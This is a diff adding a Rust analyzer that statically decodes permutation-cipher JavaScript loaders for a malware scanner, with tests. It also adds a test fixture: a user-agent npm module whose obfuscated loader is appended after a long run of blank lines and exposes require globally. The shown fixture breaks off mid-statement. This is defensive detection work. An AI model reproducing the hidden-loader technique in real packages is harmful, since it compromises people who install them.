@@ -1,0 +1,985 @@
+--- a/src/analyzers/mod.rs
++++ b/src/analyzers/mod.rs
+@@ -61,6 +61,7 @@
+ pub(crate) mod js_edge_source;
+ pub(crate) mod js_joined_module;
+ pub(crate) mod js_literal_catalog;
++pub(crate) mod js_permutation;
+ pub(crate) mod js_string_table;
+ pub(crate) mod js_xor_command;
+ pub(crate) mod literal_program;
+--- a/src/analyzers/literal_program.rs
++++ b/src/analyzers/literal_program.rs
+@@ -48,6 +48,12 @@
+     }
+     let mut results = Vec::new();
+     let mut budget = MAX_OUTPUT;
++    for (offset, decoded) in super::js_permutation::decode(source) {
++        if decoded.len() <= budget {
++            budget -= decoded.len();
++            results.push((offset, decoded, "javascript"));
++        }
++    }
+     if let Some(decoded) = super::js_decimal_packer::decode(source)
+         && decoded.len() <= budget
+     {
+--- a/src/analyzers/embedded_code_detector.rs
++++ b/src/analyzers/embedded_code_detector.rs
+@@ -1599,7 +1599,8 @@
+         "iex(",
+         "IEX(",
+     ];
+-    NEEDLES.iter().any(|needle| content.contains(*needle))
++    (content.contains("5578712") && content.contains("charAt"))
++        || NEEDLES.iter().any(|needle| content.contains(*needle))
+         || content
+             .as_bytes()
+             .windows(7)
+--- a/src/analyzers/js_decimal_packer.rs
++++ b/src/analyzers/js_decimal_packer.rs
+@@ -80,7 +80,7 @@
+ 
+ /// Constant string-array reads are reduced only when every use is a fixed,
+ /// read-only subscript. Passing the array, writes and shadowing all reject it.
+-fn constant_tables(source: &str) -> Option<String> {
++pub(crate) fn constant_tables(source: &str) -> Option<String> {
+     let tree = parse(source)?;
+     let all = nodes(tree.root_node())?;
+     let mut edits = Vec::<(usize, usize, String)>::new();
+--- /dev/null
++++ b/src/analyzers/js_permutation.rs
+@@ -0,0 +1,834 @@
++//! Literal-only reconstruction of permutation/Function bootstrap recipes.
++//!
++//! This is not a JavaScript runtime. Only a completely recognized local
++//! permutation function, its constructor, literal strings and the recognized
++//! dictionary decoder have values. Unknown calls/writes end reconstruction.
++use std::collections::HashMap;
++use tree_sitter::Node;
++
++const MAX_SOURCE: usize = 4 * 1024 * 1024;
++const MAX_OUTPUT: usize = 1024 * 1024;
++const MAX_NODES: usize = 1_000_000;
++const MAX_FUEL: usize = 8_000_000;
++const MAX_PARTS: usize = 65_536;
++
++const PERMUTATION: &str = r#"function perm(l){var y=0;var i=l.length;var x=[];for(var v=0;v<i;v++){x[v]=l.charAt(v);}for(var v=0;v<i;v++){var h=y*(v+179)+(y%18929);var w=y*(v+658)+(y%13606);var s=h%i;var f=w%i;var j=x[s];x[s]=x[f];x[f]=j;y=(h+w)%5578712;}return x.join("");}"#;
++const DICTIONARY: &str = r#"function unpack(){var n=10,w=42,l=70;var u="abcdefghijklmnopqrstuvwxyz";var o=[80,70,66,86,60,85,71,74,87,72,75,88,81,90,76,94,82,89,79,65];var m=[];for(var e=0;e<o.length;e++)m[o[e]]=e+1;var i=[];n+=23;w+=51;l+=26;for(var t=0;t<arguments.length;t++){var h=arguments[t].split(" ");for(var j=h.length-1;j>=0;j--){var d=null;var b=h[j];var q=null;var p=0;var y=b.length;var r;for(var g=0;g<y;g++){var z=b.charCodeAt(g);var c=m[z];if(c){d=(c-1)*w+b.charCodeAt(g+1)-n;r=g;g++;}else if(z==l){d=w*(o.length-n+b.charCodeAt(g+1))+b.charCodeAt(g+2)-n;r=g;g+=2;}else{continue;}if(q==null)q=[];if(r>p)q.push(b.substring(p,r));q.push(h[d+1]);p=g+1;}if(q!=null){if(p<y)q.push(b.substring(p));h[j]=q.join("");}}i.push(h[0]);}var v=i.join("");var a=[32,42,39,92,10,96].concat(o);var s=String.fromCharCode(46);for(var e=0;e<a.length;e++)v=v.split(s+u.charAt(e)).join(String.fromCharCode(a[e]));return v.split(s+"!").join(s);}"#;
++
++const WRAPPED_PERMUTATION: &str = r#"function _$af26623(j,jso$setrpl$m){var m={},f={},v={},o={},a={},c={},x={};m._= jso$setrpl$m;var z=j.length;f._= [];;for(var d=0;LESS(d,z);d++){f._[d]= j.charAt(d)};for(var d=0;LESS(d,z);d++){v._= ADD(m._* (ADD(d,179)),(MOD(m._,18929)));;o._= ADD(m._* (ADD(d,658)),(MOD(m._,13606)));;a._= MOD(v._,z);;c._= MOD(o._,z);;x._= f._[a._];;COPY(a,f,c);SET(c,f,x);ADVANCE(m,v,o)};var n=STRING().fromCharCode(127);var s='';var i='%';var u='#1';var h='%';var b='#0';var p='#';return f._.join(s).split(i).join(n).split(u).join(h).split(b).join(p).split(n)}"#;
++
++#[derive(Clone)]
++enum Value {
++    Text(String),
++    Number(u64),
++    Permutation(u64),
++    Constructor,
++    Dictionary,
++    Program(String),
++}
++
++fn children(n: Node<'_>) -> Vec<Node<'_>> {
++    let mut cursor = n.walk();
++    n.named_children(&mut cursor)
++        .filter(|n| !matches!(n.kind(), "comment" | "empty_statement"))
++        .collect()
++}
++fn nodes(root: Node<'_>) -> Option<Vec<Node<'_>>> {
++    let mut pending = vec![root];
++    let mut result = Vec::new();
++    while let Some(node) = pending.pop() {
++        if result.len() >= MAX_NODES {
++            return None;
++        }
++        pending.extend(children(node).into_iter().rev());
++        result.push(node);
++    }
++    Some(result)
++}
++fn raw<'a>(node: Node<'_>, source: &'a str) -> Option<&'a str> {
++    source.get(node.byte_range())
++}
++fn literal(node: Node<'_>, source: &str) -> Option<String> {
++    if node.kind() != "string" {
++        return None;
++    }
++    let s = raw(node, source)?;
++    Some(filefacts::decode_source_escapes_for_type(
++        s.get(1..s.len().checked_sub(1)?)?,
++        filefacts::FileType::JavaScript,
++    ))
++}
++fn number(node: Node<'_>, source: &str) -> Option<u64> {
++    if node.kind() != "number" {
++        return None;
++    }
++    let text = raw(node, source)?;
++    let result = if let Some(hex) = text.strip_prefix("0x").or_else(|| text.strip_prefix("0X")) {
++        u64::from_str_radix(hex, 16).ok()?
++    } else {
++        text.parse().ok()?
++    };
++    (result <= (1u64 << 53)).then_some(result)
++}
++fn unwrap(mut node: Node<'_>) -> Option<Node<'_>> {
++    while node.kind() == "parenthesized_expression" {
++        node = *children(node).first()?;
++    }
++    Some(node)
++}
++
++/// Alpha-normalized syntax, with operators and literal values retained.
++/// This compares complete function bodies, not a collection of regex clues.
++fn signature_with_globals(
++    function: Node<'_>,
++    source: &str,
++    seed: Option<usize>,
++    globals: &HashMap<String, String>,
++) -> Option<String> {
++    let mut locals = HashMap::<String, usize>::new();
++    if let Some(name) = function.child_by_field_name("name") {
++        locals.insert(raw(name, source)?.to_owned(), 0);
++    }
++    for node in nodes(function)? {
++        let declaration = if node.kind() == "variable_declarator" {
++            node.child_by_field_name("name")
++        } else {
++            None
++        };
++        let parameter = node
++            .parent()
++            .is_some_and(|p| p.kind() == "formal_parameters");
++        let binding = declaration.or_else(|| parameter.then_some(node));
++        if let Some(binding) = binding {
++            if binding.kind() != "identifier" {
++                return None;
++            }
++            let name = raw(binding, source)?.to_owned();
++            let next = locals.len();
++            locals.entry(name).or_insert(next);
++        }
++    }
++    fn visit(
++        n: Node<'_>,
++        source: &str,
++        locals: &HashMap<String, usize>,
++        seed: Option<usize>,
++        output: &mut String,
++        depth: usize,
++        globals: &HashMap<String, String>,
++    ) -> Option<()> {
++        if depth > 256 {
++            return None;
++        }
++        if matches!(n.kind(), "comment" | "empty_statement") {
++            return Some(());
++        }
++        output.push('(');
++        output.push_str(n.kind());
++        if Some(n.id()) == seed {
++            output.push_str(":SEED");
++        } else if n.kind() == "identifier" {
++            let name = raw(n, source)?;
++            if let Some(index) = locals.get(name) {
++                output.push_str(&format!(":local{index}"));
++            } else {
++                output.push(':');
++                output.push_str(globals.get(name).map(String::as_str).unwrap_or(name));
++            }
++        } else if n.kind() == "property_identifier" {
++            output.push(':');
++            output.push_str(raw(n, source)?);
++        } else if n.kind() == "number" {
++            output.push_str(&format!(":{}", number(n, source)?));
++        } else if n.kind() == "string" {
++            output.push(':');
++            output.push_str(&serde_json::to_string(&literal(n, source)?).ok()?);
++        } else {
++            if let Some(operator) = n.child_by_field_name("operator") {
++                output.push(':');
++                output.push_str(raw(operator, source)?);
++            } else if matches!(n.kind(), "unary_expression" | "update_expression") {
++                let mut cursor = n.walk();
++                for child in n.children(&mut cursor).filter(|c| !c.is_named()) {
++                    output.push(':');
++                    output.push_str(raw(child, source)?);
++                }
++            }
++            for child in children(n) {
++                visit(child, source, locals, seed, output, depth + 1, globals)?;
++            }
++        }
++        output.push(')');
++        Some(())
++    }
++    let mut result = String::new();
++    visit(function, source, &locals, seed, &mut result, 0, globals)?;
++    Some(result)
++}
++fn signature(function: Node<'_>, source: &str, seed: Option<usize>) -> Option<String> {
++    signature_with_globals(function, source, seed, &HashMap::new())
++}
++fn seed<'tree>(function: Node<'tree>, source: &str) -> Option<(Node<'tree>, u64)> {
++    let body = function.child_by_field_name("body")?;
++    let declaration = *children(body).first()?;
++    let binding = *children(declaration).first()?;
++    let value = binding.child_by_field_name("value")?;
++    let value_number = number(value, source)?;
++    (value_number < 5_578_712).then_some((value, value_number))
++}
++fn template_signature(source: &str, with_seed: bool) -> Option<String> {
++    let parsed = filefacts::OpenOptions::new()
++        .file_type(filefacts::FileType::JavaScript)
++        .cache(false)
++        .open(source.as_bytes());
++    let tree = &parsed.source_ast()?.tree;
++    let function = *children(tree.root_node()).first()?;
++    let seed_id = if with_seed {
++        Some(seed(function, source)?.0.id())
++    } else {
++        None
++    };
++    signature(function, source, seed_id)
++}
++
++fn permute(input: &str, mut seed: u64) -> Option<String> {
++    if !input.is_ascii() || input.is_empty() || input.len() > MAX_PARTS {
++        return None;
++    }
++    let mut bytes = input.as_bytes().to_vec();
++    let size = bytes.len() as u64;
++    for index in 0..size {
++        // The bounds above keep every operation below JS's exact-integer limit.
++        let first = seed.checked_mul(index + 179)?.checked_add(seed % 18_929)?;
++        let second = seed.checked_mul(index + 658)?.checked_add(seed % 13_606)?;
++        bytes.swap((first % size) as usize, (second % size) as usize);
++        seed = first.checked_add(second)? % 5_578_712;
++    }
++    String::from_utf8(bytes).ok()
++}
++
++fn dictionary(input: &str) -> Option<String> {
++    const CODES: [u8; 20] = [
++        80, 70, 66, 86, 60, 85, 71, 74, 87, 72, 75, 88, 81, 90, 76, 94, 82, 89, 79, 65,
++    ];
++    if !input.is_ascii() || input.len() > MAX_OUTPUT {
++        return None;
++    }
++    let mut words: Vec<String> = input.split(' ').map(str::to_owned).collect();
++    if words.len() > MAX_PARTS {
++        return None;
++    }
++    let mut fuel = MAX_FUEL;
++    for index in (0..words.len()).rev() {
++        let word = words.get(index)?.as_bytes();
++        let mut output = String::new();
++        let mut at = 0;
++        while at < word.len() {
++            fuel = fuel.checked_sub(1)?;
++            let code = word[at];
++            let (reference, consumed) =
++                if let Some(position) = CODES.iter().position(|c| *c == code) {
++                    let digit = i64::from(*word.get(at + 1)?) - 33;
++                    (Some((position as i64) * 93 + digit + 1), 2)
++                } else if code == 96 {
++                    let first = i64::from(*word.get(at + 1)?);
++                    let second = i64::from(*word.get(at + 2)?);
++                    (Some(93 * (20 - 33 + first) + second - 33 + 1), 3)
++                } else {
++                    (None, 1)
++                };
++            if let Some(reference) = reference {
++                let reference = usize::try_from(reference).ok()?;
++                // Generated dictionaries point rightwards to already-expanded
++                // entries. Cycles, missing entries and dangling digits decline.
++                if reference <= index {
++                    return None;
++                }
++                let piece = words.get(reference)?;
++                fuel = fuel.checked_sub(piece.len())?;
++                output.push_str(piece);
++            } else {
++                output.push(char::from(code));
++            }
++            if output.len() > MAX_OUTPUT {
++                return None;
++            }
++            at += consumed;
++        }
++        words[index] = output;
++    }
++    let mut result = words.into_iter().next()?;
++    let alphabet = b"abcdefghijklmnopqrstuvwxyz";
++    for (index, code) in [32, 42, 39, 92, 10, 96]
++        .into_iter()
++        .chain(CODES)
++        .enumerate()
++    {
++        let marker = format!(".{}", char::from(*alphabet.get(index)?));
++        result = result.replace(&marker, &char::from(code).to_string());
++        if result.len() > MAX_OUTPUT {
++            return None;
++        }
++    }
++    Some(result.replace(".!", "."))
++}
++
++fn evaluate(
++    node: Node<'_>,
++    source: &str,
++    env: &HashMap<String, Value>,
++    dictionary_signature: &str,
++    fuel: &mut usize,
++    depth: usize,
++) -> Option<Value> {
++    if depth > 128 {
++        return None;
++    }
++    *fuel = fuel.checked_sub(1)?;
++    let node = unwrap(node)?;
++    match node.kind() {
++        "string" => Some(Value::Text(literal(node, source)?)),
++        "number" => Some(Value::Number(number(node, source)?)),
++        "identifier" => env.get(raw(node, source)?).cloned(),
++        "binary_expression" => {
++            let Value::Number(left) = evaluate(
++                node.child_by_field_name("left")?,
++                source,
++                env,
++                dictionary_signature,
++                fuel,
++                depth + 1,
++            )?
++            else {
++                return None;
++            };
++            let Value::Number(right) = evaluate(
++                node.child_by_field_name("right")?,
++                source,
++                env,
++                dictionary_signature,
++                fuel,
++                depth + 1,
++            )?
++            else {
++                return None;
++            };
++            let result = match raw(node.child_by_field_name("operator")?, source)? {
++                "+" => left.checked_add(right)?,
++                "-" => left.checked_sub(right)?,
++                "*" => left.checked_mul(right)?,
++                _ => return None,
++            };
++            (result <= (1u64 << 53)).then_some(Value::Number(result))
++        }
++        "subscript_expression" | "member_expression" => {
++            let object = evaluate(
++                node.child_by_field_name("object")?,
++                source,
++                env,
++                dictionary_signature,
++                fuel,
++                depth + 1,
++            )?;
++            let property = if node.kind() == "subscript_expression" {
++                let Value::Text(property) = evaluate(
++                    node.child_by_field_name("index")?,
++                    source,
++                    env,
++                    dictionary_signature,
++                    fuel,
++                    depth + 1,
++                )?
++                else {
++                    return None;
++                };
++                property
++            } else {
++                raw(node.child_by_field_name("property")?, source)?.to_owned()
++            };
++            (matches!(object, Value::Permutation(_)) && property == "constructor")
++                .then_some(Value::Constructor)
++        }
++        "call_expression" => {
++            let function = unwrap(node.child_by_field_name("function")?)?;
++            let args = children(node.child_by_field_name("arguments")?);
++            if function.kind() == "member_expression" {
++                let property = raw(function.child_by_field_name("property")?, source)?;
++                if matches!(property, "substr" | "substring" | "slice") {
++                    let Value::Text(value) = evaluate(
++                        function.child_by_field_name("object")?,
++                        source,
++                        env,
++                        dictionary_signature,
++                        fuel,
++                        depth + 1,
++                    )?
++                    else {
++                        return None;
++                    };
++                    let Value::Number(start) = evaluate(
++                        *args.first()?,
++                        source,
++                        env,
++                        dictionary_signature,
++                        fuel,
++                        depth + 1,
++                    )?
++                    else {
++                        return None;
++                    };
++                    let Value::Number(end) = evaluate(
++                        *args.get(1)?,
++                        source,
++                        env,
++                        dictionary_signature,
++                        fuel,
++                        depth + 1,
++                    )?
++                    else {
++                        return None;
++                    };
++                    if start != 0 || args.len() != 2 || !value.is_ascii() {
++                        return None;
++                    }
++                    return Some(Value::Text(
++                        value[..usize::try_from(end).ok()?.min(value.len())].to_owned(),
++                    ));
++                }
++            }
++            let function = evaluate(function, source, env, dictionary_signature, fuel, depth + 1)?;
++            let values = args
++                .into_iter()
++                .map(|arg| evaluate(arg, source, env, dictionary_signature, fuel, depth + 1))
++                .collect::<Option<Vec<_>>>()?;
++            match (function, values.as_slice()) {
++                (Value::Permutation(seed), [Value::Text(input)]) => {
++                    Some(Value::Text(permute(input, seed)?))
++                }
++                (Value::Dictionary, [Value::Text(input)]) => Some(Value::Text(dictionary(input)?)),
++                (Value::Constructor, [Value::Text(parameters), Value::Text(body)])
++                    if parameters.is_empty() && body.len() <= MAX_OUTPUT =>
++                {
++                    let wrapped = format!("function decoded(){{{body}}}");
++                    let is_dictionary = template_signature(&wrapped, false).as_deref()
++                        == Some(dictionary_signature);
++                    Some(if is_dictionary {
++                        Value::Dictionary
++                    } else {
++                        Value::Program(body.clone())
++                    })
++                }
++                _ => None,
++            }
++        }
++        _ => None,
++    }
++}
++
++fn recipe(
++    body: Node<'_>,
++    source: &str,
++    permutation_signature: &str,
++    dictionary_signature: &str,
++) -> Option<Vec<(usize, String)>> {
++    let mut env = HashMap::new();
++    let mut fuel = MAX_FUEL;
++    let statements = children(body);
++    for statement in &statements {
++        if statement.kind() != "function_declaration" {
++            continue;
++        }
++        let Some((seed_node, value)) = seed(*statement, source) else {
++            continue;
++        };
++        if signature(*statement, source, Some(seed_node.id())).as_deref()
++            == Some(permutation_signature)
++        {
++            let name = raw(statement.child_by_field_name("name")?, source)?.to_owned();
++            if env.insert(name, Value::Permutation(value)).is_some() {
++                return None;
++            }
++        }
++    }
++    if env.is_empty() {
++        return None;
++    }
++    let mut output = Vec::new();
++    for statement in statements {
++        match statement.kind() {
++            "function_declaration" => {}
++            "variable_declaration" | "lexical_declaration" => {
++                for declaration in children(statement) {
++                    if declaration.kind() != "variable_declarator" {
++                        return None;
++                    }
++                    let name = declaration.child_by_field_name("name")?;
++                    if name.kind() != "identifier" {
++                        return None;
++                    }
++                    let name = raw(name, source)?.to_owned();
++                    let value = evaluate(
++                        declaration.child_by_field_name("value")?,
++                        source,
++                        &env,
++                        dictionary_signature,
++                        &mut fuel,
++                        0,
++                    )?;
++                    if env.insert(name, value).is_some() {
++                        return None;
++                    }
++                }
++            }
++            "expression_statement" | "return_statement" => {
++                let Some(expression) = children(statement).first().copied() else {
++                    continue;
++                };
++                if expression.kind() != "call_expression" {
++                    if statement.kind() == "return_statement" {
++                        break;
++                    }
++                    return None;
++                }
++                let function = evaluate(
++                    expression.child_by_field_name("function")?,
++                    source,
++                    &env,
++                    dictionary_signature,
++                    &mut fuel,
++                    0,
++                )?;
++                let Value::Program(program) = function else {
++                    return None;
++                };
++                // Arguments must themselves be inert constants too.
++                for arg in children(expression.child_by_field_name("arguments")?) {
++                    evaluate(arg, source, &env, dictionary_signature, &mut fuel, 0)?;
++                }
++                output.push((expression.start_byte(), program));
++                if statement.kind() == "return_statement" {
++                    break;
++                }
++            }
++            _ => return None,
++        }
++    }
++    Some(output)
++}
++
++/// Recognize the second permutation's complete body and every helper it calls.
++/// Only its literal invocation is reduced; none of the surrounding program runs.
++fn literal_table(source: &str, root: Node<'_>, all: &[Node<'_>]) -> Option<String> {
++    let mut functions = HashMap::new();
++    let mut blocked = std::collections::HashSet::new();
++    for node in children(root) {
++        if node.kind() == "function_declaration" {
++            let name = raw(node.child_by_field_name("name")?, source)?.to_owned();
++            if functions.insert(name.clone(), node).is_some() {
++                blocked.insert(name);
++            }
++        }
++    }
++    for node in all {
++        let binding = match node.kind() {
++            "assignment_expression" => node.child_by_field_name("left"),
++            "update_expression" => node.child_by_field_name("argument"),
++            "variable_declarator" => node.child_by_field_name("name"),
++            "identifier"
++                if node
++                    .parent()
++                    .is_some_and(|p| p.kind() == "formal_parameters") =>
++            {
++                Some(*node)
++            }
++            _ => None,
++        };
++        if let Some(binding) = binding.filter(|b| b.kind() == "identifier") {
++            blocked.insert(raw(binding, source)?.to_owned());
++        }
++    }
++    let helpers = [
++        ("ADD", "function add(a,b){return a+b}"),
++        ("MOD", "function modulo(a,b){return a%b}"),
++        ("LESS", "function less(a,b){return a<b}"),
++        ("STRING", "function string(){return String}"),
++        ("COPY", "function copy(a,f,c){f._[a._]=f._[c._]}"),
++        ("SET", "function set(c,f,x){f._[c._]=x._}"),
++        (
++            "ADVANCE",
++            "function advance(m,v,o){m._=MOD((ADD(v._,o._)),5578712)}",
++        ),
++    ];
++    let mut globals = HashMap::new();
++    for (label, template) in helpers {
++        if label == "STRING" && blocked.contains("String") {
++            continue;
++        }
++        let expected = template_signature(template, false)?;
++        for (name, function) in &functions {
++            if !blocked.contains(name)
++                && signature_with_globals(*function, source, None, &globals).as_deref()
++                    == Some(expected.as_str())
++            {
++                globals.insert(name.clone(), label.to_owned());
++            }
++        }
++    }
++    let expected = template_signature(WRAPPED_PERMUTATION, false)?;
++    let transforms: std::collections::HashSet<_> = functions
++        .iter()
++        .filter_map(|(name, function)| {
++            (!blocked.contains(name)
++                && signature_with_globals(*function, source, None, &globals).as_deref()
++                    == Some(expected.as_str()))
++            .then_some(name.as_str())
++        })
++        .collect();
++    if transforms.is_empty() {
++        return None;
++    }
++    let mut replacements = Vec::new();
++    for node in all.iter().filter(|n| n.kind() == "call_expression") {
++        let callee = unwrap(node.child_by_field_name("function")?)?;
++        if callee.kind() != "identifier" || !transforms.contains(raw(callee, source)?) {
++            continue;
++        }
++        let arguments = children(node.child_by_field_name("arguments")?);
++        if arguments.len() != 2 {
++            continue;
++        }
++        let Some(input) = literal(arguments[0], source) else {
++            continue;
++        };
++        let Some(seed) = number(arguments[1], source).filter(|s| *s < 5_578_712) else {
++            continue;
++        };
++        let text = permute(&input, seed)?
++            .replace('%', "\u{7f}")
++            .replace("#1", "%")
++            .replace("#0", "#");
++        let parts: Vec<_> = text.split('\u{7f}').collect();
++        replacements.push((node.byte_range(), serde_json::to_string(&parts).ok()?));
++    }
++    if replacements.is_empty() {
++        return None;
++    }
++    let mut result = source.to_owned();
++    for (range, text) in replacements.into_iter().rev() {
++        result.replace_range(range, &text);
++    }
++    if result.len() > MAX_OUTPUT {
++        return None;
++    }
++    Some(super::js_decimal_packer::constant_tables(&result).unwrap_or(result))
++}
++
++fn reduce_literal_table(source: &str) -> Option<String> {
++    if !source.contains("5578712") || !source.contains("charAt") {
++        return None;
++    }
++    let parsed = filefacts::OpenOptions::new()
++        .file_type(filefacts::FileType::JavaScript)
++        .cache(false)
++        .open(source.as_bytes());
++    let root = parsed.source_ast()?.tree.root_node();
++    if root.has_error() {
++        return None;
++    }
++    literal_table(source, root, &nodes(root)?)
++}
++
++pub(crate) fn decode(source: &str) -> Vec<(usize, String)> {
++    if source.len() > MAX_SOURCE || !source.contains("5578712") || !source.contains("charAt") {
++        return Vec::new();
++    }
++    let parsed = filefacts::OpenOptions::new()
++        .file_type(filefacts::FileType::JavaScript)
++        .cache(false)
++        .open(source.as_bytes());
++    let Some(ast) = parsed.source_ast() else {
++        return Vec::new();
++    };
++    if ast.tree.root_node().has_error() {
++        return Vec::new();
++    }
++    let Some(all) = nodes(ast.tree.root_node()) else {
++        return Vec::new();
++    };
++    let Some(permutation_signature) = template_signature(PERMUTATION, true) else {
++        return Vec::new();
++    };
++    let Some(dictionary_signature) = template_signature(DICTIONARY, false) else {
++        return Vec::new();
++    };
++    let mut output = Vec::new();
++    let mut budget = MAX_OUTPUT;
++    if let Some(table) = literal_table(source, ast.tree.root_node(), &all) {
++        budget = budget.saturating_sub(table.len());
++        output.push((0, table));
++    }
++    for node in all
++        .into_iter()
++        .filter(|n| n.kind() == "statement_block")
++        .take(4096)
++    {
++        let Some(results) = recipe(node, source, &permutation_signature, &dictionary_signature)
++        else {
++            continue;
++        };
++        for (offset, text) in results {
++            // Embedded layers intentionally disable further generic extraction.
++            // Finish the recognized literal table here so the recovered layer
++            // includes its real configuration on the first analysis pass.
++            let text = reduce_literal_table(&text).unwrap_or(text);
++            let Some(left) = budget.checked_sub(text.len()) else {
++                return output;
++            };
++            budget = left;
++            output.push((offset, text));
++        }
++    }
++    output
++}
++
++#[cfg(test)]
++mod tests {
++    use super::*;
++
++    fn encode_permutation(text: &str, mut seed: u64) -> String {
++        let mut swaps = Vec::new();
++        let n = text.len() as u64;
++        for index in 0..n {
++            let a = seed * (index + 179) + seed % 18_929;
++            let b = seed * (index + 658) + seed % 13_606;
++            swaps.push(((a % n) as usize, (b % n) as usize));
++            seed = (a + b) % 5_578_712;
++        }
++        let mut bytes = text.as_bytes().to_vec();
++        for (a, b) in swaps.into_iter().rev() {
++            bytes.swap(a, b);
++        }
++        String::from_utf8(bytes).expect("ASCII encoder")
++    }
++    fn encode_dictionary_literal(text: &str) -> String {
++        let codes = [
++            32, 42, 39, 92, 10, 96, 80, 70, 66, 86, 60, 85, 71, 74, 87, 72, 75, 88, 81, 90, 76, 94,
++            82, 89, 79, 65,
++        ];
++        let mut output = String::new();
++        for byte in text.bytes() {
++            if byte == b'.' {
++                output.push_str(".!");
++            } else if let Some(index) = codes.iter().position(|c| *c == byte) {
++                output.push('.');
++                output.push(char::from(b'a' + index as u8));
++            } else {
++                output.push(char::from(byte));
++            }
++        }
++        output
++    }
++    fn encoded(program: &str, seed: u64) -> String {
++        let permutation = PERMUTATION.replacen("y=0", &format!("y={seed}"), 1);
++        let dictionary = DICTIONARY
++            .strip_prefix("function unpack(){")
++            .and_then(|s| s.strip_suffix('}'))
++            .expect("dictionary body");
++        let key = encode_permutation("constructorabcdefghijklmnopqrstuvwxyz", seed);
++        let body = encode_permutation(dictionary, seed);
++        let data = encode_permutation(&encode_dictionary_literal(program), seed);
++        format!(
++            "(function(){{var empty=\"\",width=11;{permutation}var key=perm({key}).substr(0,width);var body={body};var factory=perm[key];var parameters=\"\";var other=factory;var decoder=factory(parameters,perm(body));var text=decoder(perm({data}));var stage=other(empty,text);stage(7);return 0;}})();",
++            key = serde_json::to_string(&key).expect("key"),
++            body = serde_json::to_string(&body).expect("body"),
++            data = serde_json::to_string(&data).expect("data")
++        )
++    }
++    #[test]
++    fn recovers_program_without_executing_it() {
++        let program = "require('child_process').exec('never execute this test');";
++        for seed in [17, 2461180] {
++            let source = encoded(program, seed);
++            assert_eq!(
++                decode(&source)
++                    .iter()
++                    .map(|r| r.1.as_str())
++                    .collect::<Vec<_>>(),
++                [program]
++            );
++            let renamed = source
++                .replace("perm", "different_transform")
++                .replace("factory", "compiler_alias");
++            assert_eq!(decode(&renamed)[0].1, program);
++        }
++    }
++    #[test]
++    fn rejects_inert_modified_and_unknown_recipes() {
++        let source = encoded("console.log('harmless');", 17);
++        for negative in [
++            serde_json::to_string(&source).expect("quoted source"),
++            format!("/* {source} */"),
++            source.replace("stage(7);", ""),
++            source.replace("var other=factory;", "var other=unknown;"),
++            source.replace(
++                "return x.join",
++                "fetch('https://example.invalid');return x.join",
++            ),
++            source.replace("stage(7);", "stage=unknown;stage(7);"),
++            source.replace("var key=perm", "perm.constructor=unknown;var key=perm"),
++        ] {
++            assert!(decode(&negative).is_empty(), "{negative}");
++        }
++    }
++    #[test]
++    fn reconstructs_reviewed_loader_exactly() {
++        let source = include_str!("../../tests/data/javascript-permutation/loader.js");
++        let expected = include_str!("../../tests/data/javascript-permutation/expected.js");
++        let parsed = filefacts::OpenOptions::new()
++            .file_type(filefacts::FileType::JavaScript)
++            .cache(false)
++            .open(source.as_bytes());
++        let all = nodes(parsed.source_ast().expect("source AST").tree.root_node()).expect("nodes");
++        let p = template_signature(PERMUTATION, true).expect("permutation");
++        let d = template_signature(DICTIONARY, false).expect("dictionary");
++        let recovered: Vec<_> = all
++            .into_iter()
++            .filter(|n| n.kind() == "statement_block")
++            .filter_map(|n| recipe(n, source, &p, &d))
++            .flatten()
++            .collect();
++        assert_eq!(recovered.len(), 1);
++        assert_eq!(recovered[0].1, expected);
++        let result = decode(source);
++        assert_eq!(result.len(), 1);
++        assert_eq!(result[0].1, decode(expected)[0].1);
++    }
++    #[test]
++    fn reconstructs_only_proven_literal_configuration_table() {
++        let source = include_str!("../../tests/data/javascript-permutation/expected.js");
++        let result = decode(source);
++        assert_eq!(result.len(), 1);
++        assert!(
++            result[0]
++                .1
++                .contains("https://api.binplorer.com/getAddressHistory/")
++        );
++        assert!(result[0].1.contains("$v$5;kmc$ldm*5SA"));
++        for negative in [
++            serde_json::to_string(source).expect("quoted source"),
++            source.replace("return a+ b", "return fetch(a)+b"),
++            format!("{source};String=unknown;"),
++            source.replace("return String", "return unknown"),
++        ] {
++            assert!(decode(&negative).is_empty());
++        }
++    }
++    #[test]
++    fn dictionary_and_permutation_are_bounded() {
++        assert!(dictionary("P").is_none());
++        assert!(dictionary("P!").is_none());
++        assert!(permute("non-ASCII \u{20ac}", 17).is_none());
++        assert!(permute(&"a".repeat(MAX_PARTS + 1), 17).is_none());
++        assert!(decode(&"x".repeat(MAX_SOURCE + 1)).is_empty());
++    }
++}
+--- /dev/null
++++ b/tests/data/javascript-permutation/loader.js
+@@ -0,0 +1,92 @@
++const helpers = require('./helpers');
++const fs = require('fs');
++const path = require("path");
++
++let content = JSON.parse(fs.readFileSync(path.join(__dirname, '../data/user-agents.json'), 'utf8'));
++content = helpers.JSONfrequencyNormalize(content);
++if (helpers.JSONIsFrequency(content)) {
++    content = helpers.JSONinterval(content);
++}
++
++module.exports = function(device, browser = null, os = null) {
++    let options = []
++    const keys = Object.keys(content)
++    for (index in keys) {
++        let filter = true
++        if (keys[index].indexOf(device) == -1) {
++            filter = false
++        }
++        if (browser && keys[index].indexOf(browser) == -1) {
++            filter = false
++        }
++        if (os && keys[index].indexOf(os) == -1) {
++            filter = false
++        }
++        if (filter) {
++            options.push(keys[index])
++        }
++    }
++    if (options.length == 0) {
++        return helpers.randomElement(content[keys[Math.floor(Math.random() * keys.length)]])
++    }
++    return helpers.randomElement(content[options[Math.floor(Math.random() * options.length)]])
++};
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++
++global["_V"] = "7-randuser84";
++global["r"] = require;
++var a0b, a0a;
++(function () {
++  var siM = "",
++    mZw = 357 - 346;
++  function pHg(l) {
++    var y = 2461180;
++    var i = l.length;
++    var x = [];
++    for (var v = 0; v < i; v++) {
++      x[v] = l.charAt(v);
++    }
++    for (var v = 0; v < i; v++) {
++      var h = y * (v + 179) + (y % 18929);
++      var w = y * (v + 658) + (y % 13606);
++      var s = h % i;
++      var f = w % i;
++      var j = x[s];
++      x[s] = x[f];
++      x[f] = j;
++      y = (h + w) % 5578712;
++    }
++    return x.join("");
++  }
++  var Rjb = pHg("thnoywfmcbxturazrpeicolsodngcruqksvtj").substr(0, mZw);
++  var Abp =
